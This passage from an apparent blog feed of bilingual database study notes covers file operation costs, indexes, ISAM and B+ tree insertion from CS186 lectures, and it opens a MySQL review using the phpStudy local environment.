<li>Sorted File    排序文件
<ul>
<li>Find location for record: log2 B   找到要删除的位置</li>
<li>Shift the rest by 1 record 2 * (B / 2)    将剩余的记录移动一位，填补空缺位置</li>
</ul>
</li>
</ul>
<h3 id="Cost-of-Operations-Equation-Search-Cost"><a class="header-anchor" href="#Cost-of-Operations-Equation-Search-Cost">¶</a>Cost of Operations: Equation Search Cost</h3>
<blockquote>
<p>操作成本:等式搜索成本</p>
</blockquote>
<table>
<thead>
<tr>
<th></th>
<th>Heap File</th>
<th>Sorted File</th>
</tr>
</thead>
<tbody>
<tr>
<td>Scan all records   全浏览</td>
<td>B*D</td>
<td>B*D</td>
</tr>
<tr>
<td>Equality Search   寻找某一匹配项   返回一个数据</td>
<td>0.5 * B * D</td>
<td>(log2 B) * D</td>
</tr>
<tr>
<td>Range Search    范围搜索   返回一些数据</td>
<td>B*D</td>
<td>((log2 B) + pages) * D</td>
</tr>
<tr>
<td>Insert    插入</td>
<td>2*D</td>
<td>((log2 B) + B) * D</td>
</tr>
<tr>
<td>Delete    删除</td>
<td>(0.5 * B + 1) * D</td>
<td>((log2 B) + B) * D</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p><strong>B</strong>：The number of data blocks in the file</p>
<blockquote>
<p>B→文件中的数据块的数量</p>
</blockquote>
</li>
<li>
<p><strong>R</strong>：Number of records per block</p>
<blockquote>
<p>R→每个数据块中的记录数量</p>
</blockquote>
</li>
<li>
<p><strong>D</strong>：(Average) time to read / write disk block</p>
<blockquote>
<p>D→读写磁盘块的平均时间</p>
</blockquote>
</li>
<li>
<p>可以发现：对于排序文件来说，插入和删除记录需要的成本是一样的，但是对于堆文件就不一样：插入是无意识的操作，只需要在末尾插入；但是删除则需要找到对应的数据再进行删除，多了检索成本</p>
</li>
<li>
<p>do better ？  → use indexes     使用索引，可以be better！</p>
</li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>SQL notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>CS186 SQL6 B+ Trees</title>
    <url>/2024/08/27/CS_Notes/Database/CS186%20SQL6%20B+%20Trees/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>目前看到：</li>
</ul>
<p><a href="https://www.youtube.com/watch?v=NcuORWy48Qk&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=44">(3) Lec 6 Part 1 Intro to Indexes - YouTube</a></p>
<h3 id="Reminder-on-Heap-Files"><a class="header-anchor" href="#Reminder-on-Heap-Files">¶</a>Reminder on Heap Files</h3>
<ul>
<li>
<p>Two access APIs:</p>
<blockquote>
<p>两种从堆文件中查找记录的方式</p>
</blockquote>
<ul>
<li>
<p>fetch by <strong>recordId (pageId, slotId)</strong></p>
<blockquote>
<p>直接通过给定的记录ID来检索特定的记录</p>
<p>适合快速定位单个记录，尤其是已知道记录的确切位置时</p>
</blockquote>
</li>
<li>
<p>scan (starting from some page)</p>
<blockquote>
<p>从文件中的某一页开始，顺序地读取所有记录的过程</p>
<p>通常用于全表扫描或当查询条件不支持更高效的索引访问时</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Data structures in RAM:</p>
<blockquote>
<p>内存中的数据结构</p>
</blockquote>
<ul>
<li>
<p>Search trees (Binary, AVL, Red-Black, …)</p>
<blockquote>
<p>可以在不扫描整个数据集的情况下进行查找记录的数据结构：</p>
<p>搜索树（如二叉搜索树(Binary Search Trees)，AVL树，红黑树(Red-Black Trees)，等等）</p>
<p><strong>二叉搜索树(Binary Search Trees)</strong>：每个节点最多有两个子节点，左子树上的所有节点值小于根节点值，右子树上的所有节点值大于根节点值</p>
<p><strong>AVL树</strong>：一种自平衡的二叉搜索树，任何节点的两个子树的高度最大差别为1</p>
<p><strong>红黑树(Red-Black Trees)</strong>：也是一种自平衡二叉搜索树，通过对树进行染色并在插入和删除时调整树来保持平衡</p>
</blockquote>
</li>
<li>
<p>Hash Tables</p>
<blockquote>
<p><strong>散列表(Hash Tables)</strong>：通过使用哈希函数将键映射到数组的一个位置上，从而实现快速的数据访问。</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Needed: disk-based data structures</p>
<ul>
<li>
<p>“paginated”: made up of disk pages</p>
<blockquote>
<p>由于磁盘访问的时间成本比内存访问高得多，因此磁盘上的数据结构设计通常需要考虑如何最小化磁盘I/O操作。分页技术是将数据划分为固定大小的块（称为页面），以便有效地管理和检索数据</p>
<p>分页的数据结构使得数据库管理系统能够在磁盘上高效地存储和检索数据，同时尽量减少每次磁盘访问时读取的数据量</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h3 id="Index"><a class="header-anchor" href="#Index">¶</a>Index</h3>
<ul>
<li>
<p>An <strong>index</strong> is data structure that enables fast <strong>lookup</strong> and <strong>modification</strong> of <strong>data entries</strong> by <strong>search key</strong></p>
<blockquote>
<p><strong>索引</strong>是一种数据结构，它使通过<strong>搜索键</strong>快速<strong>查找</strong>和修改\数据条目成为可能</p>
</blockquote>
<ul>
<li>
<p><strong>Lookup</strong>: may support many different operations</p>
<ul>
<li>
<p><strong>Equality</strong>, 1-d range, 2-d region, …</p>
<blockquote>
<p><strong>等值查询</strong>，一维范围查询，二维区域查询等</p>
<p><strong>等值查询</strong>：比如查找某个特定值的所有记录</p>
<p><strong>一维范围查询</strong>：查找在一个特定范围内的记录</p>
<p><strong>二维区域查询</strong>：在地理信息系统中，可能会用到这样的查询来查找落在某个矩形区域内的记录</p>
</blockquote>
</li>
<li>
<p><strong>Search Key</strong>: any subset of columns in the relation</p>
<blockquote>
<p><strong>搜索键</strong>：关系中的任何子集列</p>
<p><strong>搜索键(Search Key)</strong>：这是用来创建索引的一组列</p>
<p>可以是一个单一的列，也可以是多个列的组合</p>
<p>搜索键不需要是唯一的，这意味着同一个键值可以在表中有多个匹配项</p>
</blockquote>
<ul>
<li>do not need to be unique
<ul>
<li>e.g.:(firstname) or (first name, lastname)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Index-Part-2"><a class="header-anchor" href="#Index-Part-2">¶</a>Index Part 2</h3>
<ul>
<li>
<p><strong>Data Entries</strong>: items stored in the index</p>
<blockquote>
<p><strong>数据条目(Data Entries)</strong>：存储在索引中的项目</p>
</blockquote>
<ul>
<li>
<p>Assume for today: a pair (<strong>k</strong>, recordId)</p>
<blockquote>
<p>假设一个对(<strong>k</strong>, recordId)的配对</p>
<p>键值(<em>k</em>)对应于搜索键，而<em>recordId</em>则是指向实际数据行的指针</p>
<p><em>recordId</em>可以帮助快速定位到堆文件中的具体记录</p>
</blockquote>
<ul>
<li>
<p>Pointers to records in Heap Files</p>
<blockquote>
<p>指向堆文件中记录的指针</p>
</blockquote>
</li>
<li>
<p>Easy to generalize later</p>
<blockquote>
<p>后续容易扩展</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Modification</strong>: want to support fast insert and delete</p>
<blockquote>
<p><strong>修改(Modification)</strong>：希望支持快速插入和删除</p>
<p>索引的设计需要考虑到如何高效地进行这插入和删除等操作而不影响整体性能</p>
<p>例如，B+树在插入和删除时可以通过分裂或合并节点来维持树的平衡</p>
</blockquote>
</li>
<li>
<p>Many Types of indexes exist: B± Tree, Hash, R-Tree, GiST, …</p>
<blockquote>
<p>存在多种类型的索引：B+树、哈希索引、R树、GiST（通用搜索树）等</p>
<p><strong>B+树(B±Tree)</strong>：主要用于支持范围查询和排序。B+树的叶节点包含实际的数据指针，并且叶节点之间互相链接，便于顺序访问</p>
<p><strong>哈希索引(Hash Index)</strong>：适用于等值查询，通过哈希函数直接计算出键值的位置</p>
<p><strong>R树(R-Tree)</strong>：用于空间索引，支持多维数据的范围查询，常见于地理信息系统(GIS)</p>
<p><strong>GiST（Generalized Search Tree）</strong>：这是一个框架，用于构建多种类型的索引，支持复杂的数据结构和查询类型</p>
<p>选择哪种类型的索引取决于数据的特性和预期的查询模式</p>
</blockquote>
</li>
</ul>
<h3 id="Simple-example"><a class="header-anchor" href="#Simple-example">¶</a>Simple example</h3>
<ul>
<li>
<p><strong>Step 1</strong>: Sort heap file &amp; leave some space</p>
<blockquote>
<p>对堆文件进行排序并留出一些空闲空间</p>
<p>在创建索引之前，首先需要对堆文件中的记录进行排序</p>
<p>排序的目的是让具有相似键值的记录彼此靠近，从而提高基于键值的查找效率</p>
<p>排序时需要预留一些空闲空间，以便将来插入新记录时不需要频繁地重新组织数据</p>
</blockquote>
</li>
<li>
<p><strong>Step 2</strong>: Build the index data structure over this</p>
<blockquote>
<p>建立索引数据结构</p>
<p>索引结构的选择通常取决于数据的特性以及查询的需求</p>
</blockquote>
<ul>
<li>
<p>why not use binary search in this heap file</p>
<blockquote>
<p>why not 使用二分搜索</p>
</blockquote>
<ul>
<li>
<p>Fan-out of 2 → deep tree → lots of I/Os</p>
<blockquote>
<p>扇出度(fan-out)为2 → 树太深 → 大量的I/O操作</p>
<p>因为每次都需要访问磁盘来获取下一部分数据。这会导致效率低下，尤其是在处理大量数据时</p>
</blockquote>
</li>
<li>
<p>Examine entire records just to read key during search</p>
<blockquote>
<p>效率低→在查找过程中为了读取键而遍历所有记录</p>
<p>使用二分查找，即使只访问记录中的某个特定字段（如搜索键），也需要读取整个记录</p>
<p>因为记录在磁盘上是以连续的方式存储的，无法直接访问某个字段。这不仅浪费了带宽，也增加了不必要的磁盘I/O操作</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Build-a-high-fan-out-search-tree"><a class="header-anchor" href="#Build-a-high-fan-out-search-tree">¶</a>Build a high fan-out search tree</h3>
<blockquote>
<p>构建高扇出度的搜索树</p>
</blockquote>
<ul>
<li>
<p>Start example: <em>Sorted (key, page id) file</em></p>
<blockquote>
<p>起始示例：<em>已排序的(key, page id)文件</em></p>
<p>为要搜索的记录文件（堆）构建一个线性的索引文件</p>
<p>键值和对应的页面ID已经被排序</p>
<p>意味着，如果有一个键值，我们可以快速定位到相应的页面ID</p>
</blockquote>
<ul>
<li>
<p>No record data</p>
<blockquote>
<p>不包含记录数据</p>
<p>索引文件通常不包含完整的记录数据，而是仅包含用于快速查找的键值和指向实际数据所在页面的ID</p>
</blockquote>
</li>
<li>
<p>Binary search in the key file. Better.</p>
<blockquote>
<p>在键文件中使用二分查找效率更高</p>
<p>查找操作只需要关注键值和页面ID，减少了数据传输量，查找效率↑↑</p>
<p>二分查找对于已排序的文件分成有效，查找速度↑↑↑  ∵每次比较都可排除一半候选范围</p>
</blockquote>
</li>
<li>
<p><strong>Forgot</strong>: Need to break across pages</p>
<blockquote>
<p><strong>忽略的问题</strong>：需要跨越页面进行分割</p>
<p>在实际的磁盘文件中，数据是分页存储的</p>
<p>如果一个页面的容量有限，那么一个大的键值范围可能需要分布在多个页面上</p>
<p>要求索引结构能够有效地处理跨页面的数据</p>
</blockquote>
</li>
<li>
<p>**Complexity: ** Still binary search, just a constant factor smaller input</p>
<blockquote>
<p><strong>复杂度</strong>：仍然是二分查找，只是输入规模减小了一个常数因子</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>**<u>B+树</u>**是一种专门为磁盘存储设计的树形数据结构</p>
<ul>
<li>
<p><strong>高扇出度</strong></p>
<blockquote>
<p>每个节点可以存储多个键值对和指针，树的深度较浅，则每次查找需要访问的磁盘页面较少。</p>
</blockquote>
</li>
<li>
<p><strong>跨页面分割</strong></p>
<blockquote>
<p>B+树可以很好地处理跨页面的数据分割，因为它的设计允许在插入或删除数据时通过节点的分裂和合并来保持树的平衡。</p>
</blockquote>
</li>
<li>
<p><strong>高效的磁盘访问</strong></p>
<blockquote>
<p>B+树的节点通常存储在磁盘的单个页面中，这样可以减少磁盘I/O操作的数量，提高查找效率。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h3 id="Status-Check"><a class="header-anchor" href="#Status-Check">¶</a>Status Check</h3>
<ul>
<li>
<p>Some design goals</p>
<ul>
<li>
<p>Fast sequential scan</p>
<blockquote>
<p>快速顺序扫描</p>
<p>可采取方法：</p>
<p><strong>链式结构</strong>：将记录链接起来，使能够按顺序访问。</p>
<p>例如，在B+树中，所有叶节点都是通过指针相连的，这样可以支持顺序扫描</p>
<p><strong>预读机制</strong>：在磁盘I/O操作中，预读机制可以提前加载后续的数据页，从而减少磁盘访问延迟</p>
</blockquote>
</li>
<li>
<p>High Fan-out</p>
<blockquote>
<p><strong>高扇出度</strong>：</p>
<p>指的是每个节点可包含更多的子节点 / 键值对。</p>
<p>这样减少树的深度，从而减少查找所需的磁盘I/O操作次数</p>
<p>可采取方法：</p>
<p><strong>增加节点容量</strong>：每个节点存储更多的键值对，减少树的整体深度。</p>
<p><strong>优化页面布局</strong>：合理安排页面中数据，使能够容纳更多的信息，提高扇出度</p>
</blockquote>
</li>
<li>
<p>Support insertion</p>
<blockquote>
<p>支持插入数据</p>
<p>可采取方法：</p>
<p><strong>动态调整</strong>：插入新记录时，如果某个节点已满，则进行节点分裂，即将节点中的部分数据移动到新的节点中</p>
<p><strong>自平衡机制</strong>：例如，在B+树中，当节点分裂时，分裂产生的新节点会被正确地插入到父节点中，以保持树的平衡。</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>ISAM (Indexed Sequential Access Method)</p>
<ul>
<li>致命弱点：越来越多的溢出页面和链接列表可能占用大部分文件，最终搜索降级为线性搜索，跟没有索引的堆文件没啥两样</li>
</ul>
</li>
</ul>
<h3 id="Recap-ISAM（老idea）"><a class="header-anchor" href="#Recap-ISAM（老idea）">¶</a>Recap: ISAM（老idea）</h3>
<ul>
<li>
<p>Data entries in sorted heap file</p>
<blockquote>
<h4 id="数据条目在排序的堆文件中"><a class="header-anchor" href="#数据条目在排序的堆文件中">¶</a>数据条目在排序的堆文件中</h4>
</blockquote>
</li>
<li>
<p>High fan-out static tree index</p>
<blockquote>
<p>高扇出度的静态树索引</p>
</blockquote>
</li>
<li>
<p>Fast search + good locality</p>
<blockquote>
<p>快速搜索和良好的局部性</p>
</blockquote>
<ul>
<li>
<p>Assuming nothing changes</p>
<blockquote>
<p>假设不变性</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Insert into overflow pages</p>
<blockquote>
<p>插入到溢出页面</p>
<p>向已排序的堆文件中插入新记录时，如果当前位置的空间不足，ISAM会将新记录插入到溢出页面中</p>
<p>溢出页面用于存储那些无法立即插入到主文件中的记录。这样做可以避免频繁的页面分裂和重组，从而降低维护成本</p>
</blockquote>
</li>
</ul>
<h3 id="A-Note-of-Caution"><a class="header-anchor" href="#A-Note-of-Caution">¶</a>A Note of Caution</h3>
<ul>
<li>
<p>ISAM is an old-fashioned idea</p>
<blockquote>
<p>ISAM是一种经典的文件组织和访问方法，主要用于在磁盘上高效地存储和检索数据</p>
<p>ISAM最初设计用于那些数据相对稳定、更新频率较低的应用场景</p>
</blockquote>
<ul>
<li>
<p>Introduced by IBM in 1960s</p>
</li>
<li>
<p>B+ Trees are usually better</p>
<blockquote>
<p>B+树的优势：</p>
<p><strong>更好的动态适应性</strong>：B+树能够更好地处理数据的动态变化，包括插入和删除操作</p>
<p><strong>更高的扇出度</strong>：每个节点可以存储更多的键值对，从而减少树的深度</p>
<p><strong>更高效的磁盘访问</strong>：B+树的设计考虑了磁盘I/O的优化，能够减少磁盘访问次数</p>
</blockquote>
<ul>
<li>
<p>Though not always</p>
<blockquote>
<p>B+树good， 但不是所有情况都这样</p>
<p>对于简单应用程序或小型数据库，ISAM够用</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>But it’s a good place to start</p>
<ul>
<li>
<p>Simpler than B+ Tree, many of the same ideas</p>
<blockquote>
<p>比B+树简单， 很多概念相似</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Upshot</p>
<ul>
<li>
<p>Don’t brag about ISAM on resume</p>
<blockquote>
<p>老技术别写简历</p>
</blockquote>
</li>
<li>
<p>Do understand ISAM, and tradeoffs with B+ trees</p>
<blockquote>
<p>但理解ISAM，了解其与B+树之间的权衡（？</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h2 id="❤❤B±-Tree❤❤"><a class="header-anchor" href="#❤❤B±-Tree❤❤">¶</a>❤❤B± Tree❤❤</h2>
<h3 id="Enter-the-B-Tree"><a class="header-anchor" href="#Enter-the-B-Tree">¶</a>Enter the B+ Tree</h3>
<ul>
<li>
<p>Similar to ISAM</p>
<ul>
<li>
<p>Same interior node structure</p>
<blockquote>
<p>与ISAM相同的内部节点结构</p>
</blockquote>
<ul>
<li>
<p><code>&lt;Key, Page Ptr&gt;</code> pairs with same key invariant</p>
<blockquote>
<p><code>&lt;Key, Page Ptr&gt;</code>对，具有相同的键不变性</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Same search routine as before</p>
<blockquote>
<p>与ISAM相同的搜索程序</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><strong>Dynamic Tree Index</strong></p>
<blockquote>
<p>B+ 树是一种动态树索引</p>
</blockquote>
<ul>
<li>
<p>Always Balanced</p>
<blockquote>
<p>B+ Tree面对插入和删除操作也始终保持平衡</p>
</blockquote>
</li>
<li>
<p>Support efficient insertion &amp; deletion</p>
<blockquote>
<p>B+ 树支持高效的插入删除操作</p>
<p>B+树在插入和删除时会自动调整节点，以保持树的平衡</p>
<p>插入：分裂后的节点会被插入父节点</p>
<p>删除：删除记录时，若某节点过于稀疏，则可能进行节点合并；合并后节点同样插入父节点，保持树的平衡</p>
</blockquote>
<ul>
<li>
<p>Grows at root not leaves</p>
<blockquote>
<p><strong>在根部分裂而不是叶节点</strong>：</p>
<p>B+树在插入或删除操作时，通常会在根节点处进行分</p>
<p>树的高度增长从根节点而不是从叶节点开始</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>“+”? B- Tree that stores data entries in leaves only</p>
<blockquote>
<p>B+树是一种特殊的B树，在叶节点中只存储数据条目</p>
<p>所有的数据记录都存储在叶节点中，而非叶节点仅存储键值对和指向其他节点的指针</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>缺图：<a href="https://www.youtube.com/watch?v=xeyE8tiVzbw&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=47">(12) Lecture 6 Part 4 B+ Tree Intro - YouTube</a>   1:13</p>
</li>
<li>
<p>Occupancy Invariant</p>
<blockquote>
<p>B+树有占用不变量→保持B+树的平衡性和高效性</p>
</blockquote>
<ul>
<li>
<p>Each interior node is at least partially full:</p>
<blockquote>
<p>每个内部节点</p>
</blockquote>
<ul>
<li>
<p><strong>d &lt;= #entries &lt;= 2d</strong></p>
<blockquote>
<p>内部节点的键值数量必须在 <code>d</code> 到 <code>2d</code> 之间</p>
</blockquote>
</li>
<li>
<p><strong>d: order of the tree (max fan-out = 2d + 1)</strong></p>
<blockquote>
<p><strong>d: 树的阶数</strong></p>
<p>阶数为d的树的最大扇出度 = 2d + 1</p>
<p>每个键值后面都有一个指针指向下一个节点，加上最后一个指针，总共可以有 <code>2d + 1</code> 个子节点。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Data pages at bottom need not to be stored in logical order</p>
<blockquote>
<p>B+树底层的数据页面不必按逻辑顺序存储</p>
</blockquote>
<ul>
<li>
<p>Next and prev pointers</p>
<blockquote>
<p>前后指针</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>缺图：<a href="https://www.youtube.com/watch?v=xeyE8tiVzbw&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=47">(12) Lecture 6 Part 4 B+ Tree Intro - YouTube</a>   2:46  4:00</p>
</li>
</ul>
<h3 id="B-Tree-in-Practice"><a class="header-anchor" href="#B-Tree-in-Practice">¶</a>B+ Tree in Practice</h3>
<blockquote>
<p>B+ Tree在实践中的应用</p>
</blockquote>
<ul>
<li>
<p>Typical order: 1600. Typical fill-factor: 67%</p>
<blockquote>
<p>典型的阶数(order)：1600**。**典型的填充率(fill-factor)：67%</p>
</blockquote>
<ul>
<li>
<p>average fan-out = 2144</p>
<blockquote>
<p>平均扇出度(fan-out) = 2144</p>
</blockquote>
</li>
<li>
<p>(assuming 128 Kbytes pages at 40Bytes per record)</p>
<blockquote>
<p>（假设页面大小为128 KB，每条记录占用40字节）</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>At typical capacities</p>
<blockquote>
<p>在典型容量下的高度</p>
</blockquote>
<ul>
<li>Height 1:2144^2 = 4,596,736 records</li>
<li>Height 2:2144^3 = 9,855,401,984 records</li>
</ul>
</li>
<li>
<p>B+树的高度低，但数据量大</p>
</li>
</ul>
<h3 id="Searching-the-B-Tree"><a class="header-anchor" href="#Searching-the-B-Tree">¶</a>Searching the B+ Tree</h3>
<ul>
<li>Same as ISAM</li>
<li>Find key = 27
<ul>
<li>Find split on each node (Binary Search)</li>
<li>Follow pointer to next node</li>
</ul>
</li>
<li>索引：&lt;键key, 指向记录的指针pointer&gt;</li>
</ul>
<h3 id="Insert-x-into-a-B-Tree"><a class="header-anchor" href="#Insert-x-into-a-B-Tree">¶</a>Insert x into a B+ Tree</h3>
<ul>
<li>
<p>Find the correct leaf</p>
<blockquote>
<p>找到正确的叶子结点</p>
</blockquote>
</li>
<li>
<p>If there is room in the leaf just add the entry</p>
<ul>
<li>Sort the leaf page by key</li>
</ul>
</li>
</ul>
<h3 id="Inserting-x-into-a-B-Tree-Insert"><a class="header-anchor" href="#Inserting-x-into-a-B-Tree-Insert">¶</a>Inserting x into a B+ Tree: Insert</h3>
<ul>
<li>
<p>Find the correct leaf</p>
<blockquote>
<p>找到正确的叶子结点</p>
</blockquote>
<ul>
<li>
<p>Split leaf if there is not enough room</p>
<blockquote>
<p>没有足够的空间，就分割叶子结点</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Redistribute entries evenly</p>
</li>
</ul>
<blockquote>
<p>重新分配旧的叶子节点</p>
</blockquote>
<ul>
<li>
<p>Fix next / prev pointers</p>
<blockquote>
<p>找到下一个 / 上一个指针，分割旧的叶子节点</p>
</blockquote>
</li>
<li>
<p><strong>Copy up from leaf</strong> the middle key</p>
<blockquote>
<p>创建一个父节点，其将成为一个新的索引条目；该索引条目将指向该节点，并作为分割键</p>
<p>索引的值取节点内最小值</p>
<p>然后将新的索引放入原始节点的父节点中</p>
</blockquote>
</li>
<li>
<p>recursively split index nodes</p>
<blockquote>
<p>递归地将父节点拆分为两半</p>
</blockquote>
<ul>
<li>
<p>redistribute the rightmost d keys</p>
<blockquote>
<p>重新分配最右边的d</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><strong>push up from interior node</strong> the middle key</p>
<blockquote>
<p>把分到右拆分结点的最左边的key取出，成为新的根节点</p>
<p>缺图   <a href="https://www.youtube.com/watch?v=iQ1lmTnZOT8&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=49">(12) Lecture 6 Part 6 - YouTube</a>   3:23</p>
</blockquote>
<ul>
<li>
<p>Now the last key on left</p>
<blockquote>
<p>原父节点最后一个key就是左拆分结点最左边的key</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>分割父节点时，必须实际分配一个新节点root分裂右侧的父节点；分配一个新的根，树就会增长一级</p>
</li>
</ul>
<h3 id="Copy-up-vs-Push-up"><a class="header-anchor" href="#Copy-up-vs-Push-up">¶</a>Copy up vs Push up</h3>
<ul>
<li>
<p>Notice：</p>
<blockquote>
<p>在B+树中，当进行插入操作时，可能会导致节点分裂。分裂后，需要将某些条目向上移动到父节点</p>
<p>具体来说，有两种不同的方式来处理这些条目：<strong>复制</strong>和<strong>推</strong></p>
<ol>
<li><strong>复制（Copy up）</strong>：
<ul>
<li>当一个叶节点分裂时，其中一个条目会被复制到父节点中。这个条目通常是最小或最大的键值。</li>
<li>例如，如果叶节点分裂后产生了两个新的叶节点，其中一个叶节点的第一个条目会被复制到父节点中。</li>
</ul>
</li>
<li><strong>推（Push up）</strong>：
<ul>
<li>当一个内部节点分裂时，中间的键值会被推到父节点中。这个键值用于区分两个新的子节点。</li>
<li>例如，如果内部节点分裂后产生了两个新的内部节点，中间的键值会被推到父节点中，用于区分这两个新的子节点</li>
</ul>
</li>
</ol>
</blockquote>
<ul>
<li>
<p>The <strong>leaf</strong> entry (5) was <strong>copied</strong> up</p>
<blockquote>
<p><strong>叶节点</strong>条目 (5) 被<strong>复制</strong>到上层</p>
</blockquote>
</li>
<li>
<p>The <strong>index</strong> entry (17) was <strong>pushed</strong> up</p>
<blockquote>
<p><strong>索引</strong>条目 (17) 被<strong>推</strong>到上层</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h3 id="Inserting-x-into-a-B-Tree-Final"><a class="header-anchor" href="#Inserting-x-into-a-B-Tree-Final">¶</a>Inserting x into a B+ Tree: Final</h3>
<ul>
<li>
<p>Check invariants</p>
<blockquote>
<p>检查不变量</p>
</blockquote>
</li>
<li>
<p><strong>Key Invariant</strong>:</p>
<blockquote>
<p>键不变量</p>
<p><strong>键不变量</strong>：每个内部节点的键值用于区分其子节点。具体来说，对于每个内部节点 <code>[..., (Kl, Pl), ...]</code>，其中 <code>(Kl, Pl)</code> 表示键值 <code>Kl</code> 和指向子节点 <code>Pl</code> 的指针，必须满足 <code>Kl ≤ K</code> 对于 <code>Pl</code> 子树中的所有键值 <code>K</code></p>
</blockquote>
<ul>
<li>Node[…, (Kl, Pl), …] → Kl &lt;= K for all K in Pl Sub-tree</li>
</ul>
</li>
<li>
<p><strong>Occupancy Invariant</strong></p>
<blockquote>
<p>占用不变量</p>
<p><strong>占用不变量</strong>：每个节点（无论是内部节点还是叶节点）的条目数量必须在 <code>d</code> 和 <code>2d</code> 之间。</p>
<ul>
<li><code>d</code> 是树的阶数，表示每个节点至少包含 <code>d</code> 个条目。</li>
<li><code>2d</code> 是每个节点最多可以包含的条目数量</li>
</ul>
</blockquote>
<ul>
<li>d &lt;= # entries &lt;= 2d</li>
</ul>
</li>
</ul>
<h2 id="B-Tree-Insert-Algorithm-Sketch"><a class="header-anchor" href="#B-Tree-Insert-Algorithm-Sketch">¶</a>B+ Tree Insert: Algorithm Sketch</h2>
<ul>
<li>
<p>Find the correct leaf L</p>
<blockquote>
<p>找到正确的要插入的叶子节点</p>
<p>通过典型的搜索算法来完成</p>
</blockquote>
</li>
<li>
<p>Put data entry onto L</p>
<blockquote>
<p>将数据条目放到叶子节点 L 上</p>
</blockquote>
<ul>
<li>
<p>If L has enough space, done</p>
<blockquote>
<p>如果叶子节点 L 有足够的空间（即条目数量不超过 <code>2d</code>），直接将新的条目插入到 L 中</p>
</blockquote>
</li>
<li>
<p>Else, must split L (into L and a new node L2)</p>
<blockquote>
<p>如果叶子节点 L 没有足够的空间（即条目数量超过 <code>2d</code>），则需要分裂 L</p>
</blockquote>
<ul>
<li>
<p>Redistribute entries evenly, copy up middle key</p>
<blockquote>
<p><strong>均匀重新分配条目</strong>：将 L 中的条目均匀地重新分配到两个新的节点中，即 L 和新的节点 L2。</p>
<p><strong>复制中间键</strong>：将中间的键值复制到父节点中。这个中间键值用于区分两个新的子节点。</p>
</blockquote>
</li>
<li>
<p>Insert index entry pointing to L2 into parent of L</p>
<blockquote>
<p><strong>插入索引条目</strong>：在 L 的父节点中插入一个新的索引条目，该条目指向新的节点 L2</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>SQL notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>【在xp.cn上】MySQL+PHP复习</title>
    <url>/2024/07/11/CS_Notes/Database/PHP+MySQL_note_and_practice/</url>
    <content><![CDATA[<h2 id="xp-cn下的MySQL"><a class="header-anchor" href="#xp-cn下的MySQL">¶</a>xp.cn下的MySQL</h2>
<p>本地的MySQL之前被卸载了，为了不跟小皮的冲突</p>
<p>访问xp.cn的MySQL路径：<code>phpstudy_pro\Extensions\MySQL5.7.26\bin</code></p>
<p>在当前路径下访问cmd</p>
<p><code>mysql -uroot -p</code>     密码可见小皮界面的数据库模块</p>
<p><code>show databases;</code> 查看所有库</p>
<p><code>use database_name;</code> 使用某个库</p>
<p><code>show tables;</code>  显示当前库中所有的表</p>
<p><code>select * from table_name;</code>  显示当前库中某表的所有内容</p>
<h2 id="创建数据库与表，插入数据"><a class="header-anchor" href="#创建数据库与表，插入数据">¶</a>创建数据库与表，插入数据</h2>
<h4 id="数据库的整体结构："><a class="header-anchor" href="#数据库的整体结构：">¶</a><strong>数据库的整体结构：</strong></h4>
<ul>
<li>电脑（服务器）-&gt;数据库软件（mysql、mssql、甲骨文、mariadb…）-&gt;数据库-&gt; 表-&gt;字段</li>
</ul>
<h4 id="数据库进入方法："><a class="header-anchor" href="#数据库进入方法：">¶</a><strong>数据库进入方法：</strong></h4>
<p>​	1、直接进入</p>
<p>​	2、使用软件连接</p>
<p>​	3、使用phpmyadmin //注意，PHP版本要高于7.0才可以直接使用</p>
<p>​	进入sql代码，在mysql的bin路径输入</p>
<p>​	<code>.\mysql.exe -h 127.0.0.1 -u root -p</code></p>
<h4 id="数据库操纵语句"><a class="header-anchor" href="#数据库操纵语句">¶</a><strong>数据库操纵语句</strong></h4>
<ul>
<li>
<p>查询MySQL内的数据库</p>
<ul>
<li>show databases;`</li>
</ul>
</li>
<li>
<p>创建库</p>
<ul>
<li>create database kkk;`</li>
</ul>
</li>
<li>
<p>删除库</p>
<ul>
<li>drop database kkk;`</li>
</ul>
</li>
<li>
<p>创建表，之前需要先构思好表单的结构，然后创建每个表的属性</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>id</th>
